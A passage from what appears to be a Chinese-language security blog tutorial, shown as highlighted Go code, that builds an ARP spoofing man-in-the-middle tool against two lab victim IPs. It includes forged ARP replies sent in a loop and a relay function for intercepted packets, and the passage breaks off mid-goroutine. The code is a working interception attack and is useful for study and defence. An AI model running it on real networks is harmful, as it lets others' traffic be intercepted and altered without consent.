+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">getMACFromARP</span><span class="p">(</span><span class="nx">ip</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="nx">net</span><span class="p">.</span><span class="nx">HardwareAddr</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">out</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="s">&#34;arp&#34;</span><span class="p">,</span> <span class="s">&#34;-n&#34;</span><span class="p">,</span> <span class="nx">ip</span><span class="p">).</span><span class="nf">Output</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">err</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">fields</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Fields</span><span class="p">(</span><span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">field</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">fields</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Count</span><span class="p">(</span><span class="nx">field</span><span class="p">,</span> <span class="s">&#34;:&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">5</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nx">net</span><span class="p">.</span><span class="nf">ParseMAC</span><span class="p">(</span><span class="nx">field</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;未找到 MAC 地址: %s&#34;</span><span class="p">,</span> <span class="nx">ip</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">resolveMAC</span><span class="p">(</span><span class="nx">handle</span> <span class="o">*</span><span class="nx">pcap</span><span class="p">.</span><span class="nx">Handle</span><span class="p">,</span> <span class="nx">iface</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">srcMAC</span> <span class="nx">net</span><span class="p">.</span><span class="nx">HardwareAddr</span><span class="p">,</span> <span class="nx">srcIP</span><span class="p">,</span> <span class="nx">dstIP</span> <span class="nx">net</span><span class="p">.</span><span class="nx">IP</span><span class="p">)</span> <span class="p">(</span><span class="nx">net</span><span class="p">.</span><span class="nx">HardwareAddr</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">ctx</span><span class="p">,</span> <span class="nx">cancel</span> <span class="o">:=</span> <span class="nx">context</span><span class="p">.</span><span class="nf">WithTimeout</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">(),</span> <span class="mi">2</span><span class="o">*</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">defer</span> <span class="nf">cancel</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">_</span> <span class="p">=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">CommandContext</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="s">&#34;ping&#34;</span><span class="p">,</span> <span class="s">&#34;-c&#34;</span><span class="p">,</span> <span class="s">&#34;1&#34;</span><span class="p">,</span> <span class="nx">dstIP</span><span class="p">.</span><span class="nf">String</span><span class="p">()).</span><span class="nf">Run</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="nx">ether</span> <span class="o">:=</span> <span class="nx">layers</span><span class="p">.</span><span class="nx">Ethernet</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">SrcMAC</span><span class="p">:</span>       <span class="nx">srcMAC</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">DstMAC</span><span class="p">:</span>       <span class="nx">net</span><span class="p">.</span><span class="nx">HardwareAddr</span><span class="p">{</span><span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">EthernetType</span><span class="p">:</span> <span class="nx">layers</span><span class="p">.</span><span class="nx">EthernetTypeARP</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">arp</span> <span class="o">:=</span> <span class="nx">layers</span><span class="p">.</span><span class="nx">ARP</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">AddrType</span><span class="p">:</span>          <span class="nx">layers</span><span class="p">.</span><span class="nx">LinkTypeEthernet</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Protocol</span><span class="p">:</span>          <span class="nx">layers</span><span class="p">.</span><span class="nx">EthernetTypeIPv4</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">HwAddressSize</span><span class="p">:</span>     <span class="mi">6</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">ProtAddressSize</span><span class="p">:</span>   <span class="mi">4</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Operation</span><span class="p">:</span>         <span class="nx">layers</span><span class="p">.</span><span class="nx">ARPRequest</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">SourceHwAddress</span><span class="p">:</span>   <span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">srcMAC</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">SourceProtAddress</span><span class="p">:</span> <span class="nx">srcIP</span><span class="p">.</span><span class="nf">To4</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">DstHwAddress</span><span class="p">:</span>      <span class="p">[]</span><span class="kt">byte</span><span class="p">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">DstProtAddress</span><span class="p">:</span>    <span class="nx">dstIP</span><span class="p">.</span><span class="nf">To4</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">buf</span> <span class="o">:=</span> <span class="nx">gopacket</span><span class="p">.</span><span class="nf">NewSerializeBuffer</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">gopacket</span><span class="p">.</span><span class="nf">SerializeLayers</span><span class="p">(</span><span class="nx">buf</span><span class="p">,</span> <span class="nx">gopacket</span><span class="p">.</span><span class="nx">SerializeOptions</span><span class="p">{},</span> <span class="o">&amp;</span><span class="nx">ether</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">arp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">err</span> <span class="o">:=</span> <span class="nx">handle</span><span class="p">.</span><span class="nf">WritePacketData</span><span class="p">(</span><span class="nx">buf</span><span class="p">.</span><span class="nf">Bytes</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">err</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="nx">packetSource</span> <span class="o">:=</span> <span class="nx">gopacket</span><span class="p">.</span><span class="nf">NewPacketSource</span><span class="p">(</span><span class="nx">handle</span><span class="p">,</span> <span class="nx">handle</span><span class="p">.</span><span class="nf">LinkType</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">timeout</span> <span class="o">:=</span> <span class="nx">time</span><span class="p">.</span><span class="nf">After</span><span class="p">(</span><span class="mi">3</span> <span class="o">*</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">select</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">case</span> <span class="nx">packet</span> <span class="o">:=</span> <span class="o">&lt;-</span><span class="nx">packetSource</span><span class="p">.</span><span class="nf">Packets</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="nx">a</span> <span class="o">:=</span> <span class="nx">packet</span><span class="p">.</span><span class="nf">Layer</span><span class="p">(</span><span class="nx">layers</span><span class="p">.</span><span class="nx">LayerTypeARP</span><span class="p">);</span> <span class="nx">a</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">arpLayer</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">a</span><span class="p">.(</span><span class="o">*</span><span class="nx">layers</span><span class="p">.</span><span class="nx">ARP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="k">if</span> <span class="nx">net</span><span class="p">.</span><span class="nf">IP</span><span class="p">(</span><span class="nx">arpLayer</span><span class="p">.</span><span class="nx">SourceProtAddress</span><span class="p">).</span><span class="nf">Equal</span><span class="p">(</span><span class="nx">dstIP</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="k">return</span> <span class="nx">net</span><span class="p">.</span><span class="nf">HardwareAddr</span><span class="p">(</span><span class="nx">arpLayer</span><span class="p">.</span><span class="nx">SourceHwAddress</span><span class="p">),</span> <span class="kc">nil</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">timeout</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">log</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;[!] ARP 响应超时，尝试从系统缓存获取 %s 的 MAC...&#34;</span><span class="p">,</span> <span class="nx">dstIP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nf">getMACFromARP</span><span class="p">(</span><span class="nx">dstIP</span><span class="p">.</span><span class="nf">String</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">sendARPReply</span><span class="p">(</span><span class="nx">handle</span> <span class="o">*</span><span class="nx">pcap</span><span class="p">.</span><span class="nx">Handle</span><span class="p">,</span> <span class="nx">attackerMAC</span> <span class="nx">net</span><span class="p">.</span><span class="nx">HardwareAddr</span><span class="p">,</span> <span class="nx">spoofedIP</span> <span class="nx">net</span><span class="p">.</span><span class="nx">IP</span><span class="p">,</span> <span class="nx">targetIP</span> <span class="nx">net</span><span class="p">.</span><span class="nx">IP</span><span class="p">,</span> <span class="nx">targetMAC</span> <span class="nx">net</span><span class="p">.</span><span class="nx">HardwareAddr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">e</span> <span class="o">:=</span> <span class="nx">layers</span><span class="p">.</span><span class="nx">Ethernet</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">SrcMAC</span><span class="p">:</span>       <span class="nx">attackerMAC</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">DstMAC</span><span class="p">:</span>       <span class="nx">targetMAC</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">EthernetType</span><span class="p">:</span> <span class="nx">layers</span><span class="p">.</span><span class="nx">EthernetTypeARP</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">a</span> <span class="o">:=</span> <span class="nx">layers</span><span class="p">.</span><span class="nx">ARP</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">AddrType</span><span class="p">:</span>          <span class="nx">layers</span><span class="p">.</span><span class="nx">LinkTypeEthernet</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Protocol</span><span class="p">:</span>          <span class="nx">layers</span><span class="p">.</span><span class="nx">EthernetTypeIPv4</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">HwAddressSize</span><span class="p">:</span>     <span class="mi">6</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">ProtAddressSize</span><span class="p">:</span>   <span class="mi">4</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Operation</span><span class="p">:</span>         <span class="nx">layers</span><span class="p">.</span><span class="nx">ARPReply</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">SourceHwAddress</span><span class="p">:</span>   <span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">attackerMAC</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">SourceProtAddress</span><span class="p">:</span> <span class="nx">spoofedIP</span><span class="p">.</span><span class="nf">To4</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">DstHwAddress</span><span class="p">:</span>      <span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">targetMAC</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">DstProtAddress</span><span class="p">:</span>    <span class="nx">targetIP</span><span class="p">.</span><span class="nf">To4</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">buf</span> <span class="o">:=</span> <span class="nx">gopacket</span><span class="p">.</span><span class="nf">NewSerializeBuffer</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">opts</span> <span class="o">:=</span> <span class="nx">gopacket</span><span class="p">.</span><span class="nx">SerializeOptions</span><span class="p">{}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">gopacket</span><span class="p">.</span><span class="nf">SerializeLayers</span><span class="p">(</span><span class="nx">buf</span><span class="p">,</span> <span class="nx">opts</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">e</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">err</span> <span class="o">:=</span> <span class="nx">handle</span><span class="p">.</span><span class="nf">WritePacketData</span><span class="p">(</span><span class="nx">buf</span><span class="p">.</span><span class="nf">Bytes</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;发送失败：&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">log</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;[ARP] 假冒 %s -&gt; 发送给 %s 成功&#34;</span><span class="p">,</span> <span class="nx">spoofedIP</span><span class="p">,</span> <span class="nx">targetIP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">iface</span> <span class="o">:=</span> <span class="nx">flag</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="s">&#34;i&#34;</span><span class="p">,</span> <span class="s">&#34;eth0&#34;</span><span class="p">,</span> <span class="s">&#34;网卡名&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">victim1IP</span> <span class="o">:=</span> <span class="nx">flag</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="s">&#34;v1&#34;</span><span class="p">,</span> <span class="s">&#34;172.20.0.101&#34;</span><span class="p">,</span> <span class="s">&#34;受害者1 IP&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">victim2IP</span> <span class="o">:=</span> <span class="nx">flag</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="s">&#34;v2&#34;</span><span class="p">,</span> <span class="s">&#34;172.20.0.102&#34;</span><span class="p">,</span> <span class="s">&#34;受害者2 IP&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">flag</span><span class="p">.</span><span class="nf">Parse</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">attackerMAC</span><span class="p">,</span> <span class="nx">attackerIP</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">getLocalInfo</span><span class="p">(</span><span class="o">*</span><span class="nx">iface</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="s">&#34;获取本机信息失败:&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;[本机信息] IP: %s, MAC: %s\n&#34;</span><span class="p">,</span> <span class="nx">attackerIP</span><span class="p">,</span> <span class="nx">attackerMAC</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">handle</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">pcap</span><span class="p">.</span><span class="nf">OpenLive</span><span class="p">(</span><span class="o">*</span><span class="nx">iface</span><span class="p">,</span> <span class="mi">65536</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">pcap</span><span class="p">.</span><span class="nx">BlockForever</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">defer</span> <span class="nx">handle</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">t1IP</span> <span class="o">:=</span> <span class="nx">net</span><span class="p">.</span><span class="nf">ParseIP</span><span class="p">(</span><span class="o">*</span><span class="nx">victim1IP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">t2IP</span> <span class="o">:=</span> <span class="nx">net</span><span class="p">.</span><span class="nf">ParseIP</span><span class="p">(</span><span class="o">*</span><span class="nx">victim2IP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">t1MAC</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">resolveMAC</span><span class="p">(</span><span class="nx">handle</span><span class="p">,</span> <span class="o">*</span><span class="nx">iface</span><span class="p">,</span> <span class="nx">attackerMAC</span><span class="p">,</span> <span class="nx">attackerIP</span><span class="p">,</span> <span class="nx">t1IP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">log</span><span class="p">.</span><span class="nf">Fatalf</span><span class="p">(</span><span class="s">&#34;无法解析 victim1 MAC: %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">t2MAC</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">resolveMAC</span><span class="p">(</span><span class="nx">handle</span><span class="p">,</span> <span class="o">*</span><span class="nx">iface</span><span class="p">,</span> <span class="nx">attackerMAC</span><span class="p">,</span> <span class="nx">attackerIP</span><span class="p">,</span> <span class="nx">t2IP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">log</span><span class="p">.</span><span class="nf">Fatalf</span><span class="p">(</span><span class="s">&#34;无法解析 victim2 MAC: %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">sendARPReply</span><span class="p">(</span><span class="nx">handle</span><span class="p">,</span> <span class="nx">attackerMAC</span><span class="p">,</span> <span class="nx">t2IP</span><span class="p">,</span> <span class="nx">t1IP</span><span class="p">,</span> <span class="nx">t1MAC</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">sendARPReply</span><span class="p">(</span><span class="nx">handle</span><span class="p">,</span> <span class="nx">attackerMAC</span><span class="p">,</span> <span class="nx">t1IP</span><span class="p">,</span> <span class="nx">t2IP</span><span class="p">,</span> <span class="nx">t2MAC</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>运行结果如下</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250516025753.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250516025753.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250516025741.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250516025741.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>接下来就能实现接收双方通信内容并转发</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">go</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="go"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">relayPacket</span><span class="p">(</span><span class="nx">handle</span> <span class="o">*</span><span class="nx">pcap</span><span class="p">.</span><span class="nx">Handle</span><span class="p">,</span> <span class="nx">packet</span> <span class="nx">gopacket</span><span class="p">.</span><span class="nx">Packet</span><span class="p">,</span> <span class="nx">dstMAC</span> <span class="nx">net</span><span class="p">.</span><span class="nx">HardwareAddr</span><span class="p">,</span> <span class="nx">srcMAC</span> <span class="nx">net</span><span class="p">.</span><span class="nx">HardwareAddr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">ethLayer</span> <span class="o">:=</span> <span class="nx">packet</span><span class="p">.</span><span class="nf">Layer</span><span class="p">(</span><span class="nx">layers</span><span class="p">.</span><span class="nx">LayerTypeEthernet</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">ethLayer</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">eth</span> <span class="o">:=</span> <span class="nx">ethLayer</span><span class="p">.(</span><span class="o">*</span><span class="nx">layers</span><span class="p">.</span><span class="nx">Ethernet</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">eth</span><span class="p">.</span><span class="nx">DstMAC</span> <span class="p">=</span> <span class="nx">dstMAC</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">eth</span><span class="p">.</span><span class="nx">SrcMAC</span> <span class="p">=</span> <span class="nx">srcMAC</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">buf</span> <span class="o">:=</span> <span class="nx">gopacket</span><span class="p">.</span><span class="nf">NewSerializeBuffer</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">err</span> <span class="o">:=</span> <span class="nx">gopacket</span><span class="p">.</span><span class="nf">SerializePacket</span><span class="p">(</span><span class="nx">buf</span><span class="p">,</span> <span class="nx">gopacket</span><span class="p">.</span><span class="nx">SerializeOptions</span><span class="p">{},</span> <span class="nx">packet</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;序列化失败:&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">err</span> <span class="p">=</span> <span class="nx">handle</span><span class="p">.</span><span class="nf">WritePacketData</span><span class="p">(</span><span class="nx">buf</span><span class="p">.</span><span class="nf">Bytes</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;重发失败:&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>在main里调协程</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">go</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="go"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">packetSource</span> <span class="o">:=</span> <span class="nx">gopacket</span><span class="p">.</span><span class="nf">NewPacketSource</span><span class="p">(</span><span class="nx">handle</span><span class="p">,</span> <span class="nx">handle</span><span class="p">.</span><span class="nf">LinkType</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="nx">packet</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">packetSource</span><span class="p">.</span><span class="nf">Packets</span><span class="p">()</span> <span class="p">{</span>
